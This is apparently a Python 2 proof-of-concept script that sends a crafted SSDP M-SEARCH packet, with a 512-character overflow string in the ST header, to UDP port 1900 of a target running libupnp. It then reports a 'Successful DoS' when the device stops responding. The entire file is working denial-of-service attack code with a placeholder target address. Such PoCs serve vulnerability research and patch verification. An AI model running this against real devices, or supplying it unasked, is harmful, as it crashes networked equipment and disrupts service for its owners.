#!/usr/bin/python2
# -*- coding: utf-8 -*-
# Usage: python2 libupnp_DoS_PoC.py

import socket

TARGET = 'TARGET_IP'

'''
normal_traffic = \
    'M-SEARCH * HTTP/1.1\r\n'                   \
    'HOST:239.255.255.250:1900\r\n'             \
    'MX:3\r\n'                                  \
    'MAN:"ssdp:discover"\r\n'                   \
    'ST:upnp:rootdevice\r\n'                    \
    '\r\n'
'''

dos = \
    'M-SEARCH * HTTP/1.1\r\n'                   \
    'HOST:239.255.255.250:1900\r\n'             \
    'MX:3\r\n'                                  \
    'MAN:"ssdp:discover"\r\n'                   \
    'ST:uuid:schemas:device:{}:anything\r\n'    \
    '\r\n'.format("A"*512)

# Set up UDP socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(1)
s.sendto(dos, (TARGET, 1900))

try:
    while True:
        data, addr = s.recvfrom(65507)  # Maximum UDP data length
        print "------------------------\nFailed DoS...\n------------------------\n"
        print "Response:"
        print addr, data
        exit(1)
except socket.timeout:
    print "------------------------\nSuccessful DoS!!!\n------------------------\n"
    exit(0)
